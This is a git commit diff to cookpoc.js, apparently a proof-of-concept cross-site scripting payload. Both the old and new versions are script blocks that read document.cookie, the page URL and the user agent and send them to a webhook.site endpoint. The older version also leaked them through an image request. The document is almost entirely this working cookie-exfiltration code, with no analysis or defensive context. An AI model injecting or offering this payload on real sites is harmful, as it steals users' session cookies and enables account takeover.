cf1df86254aff09d70c4c66779230d81a8de212f
CriThicK <crithick@proton.me>
2026-06-21 11:58:43 +0200

    Update cookpoc.js

--- cookpoc.js
+++ cookpoc.js
@@ -1,16 +1,10 @@
 <script>
-    var webhook = "https://webhook.site/3ba54176-c9e2-4a19-9e45-905ec0f200d9";
-    
-    fetch(webhook, {
-        method: "POST",
-        mode: "no-cors",
-        body: JSON.stringify({
-            cookies: document.cookie,
-            url: window.location.href,
-            time: new Date().toISOString(),
-            userAgent: navigator.userAgent
-        })
-    });
-    
-    new Image().src = webhook + "?cookies=" + encodeURIComponent(document.cookie) + "&url=" + encodeURIComponent(window.location.href);
+fetch("https://webhook.site/3ba54176-c9e2-4a19-9e45-905ec0f200d9", {
+  method: "POST",
+  body: JSON.stringify({
+    url: location.href,
+    cookies: document.cookie,
+    userAgent: navigator.userAgent
+  })
+});
 </script>
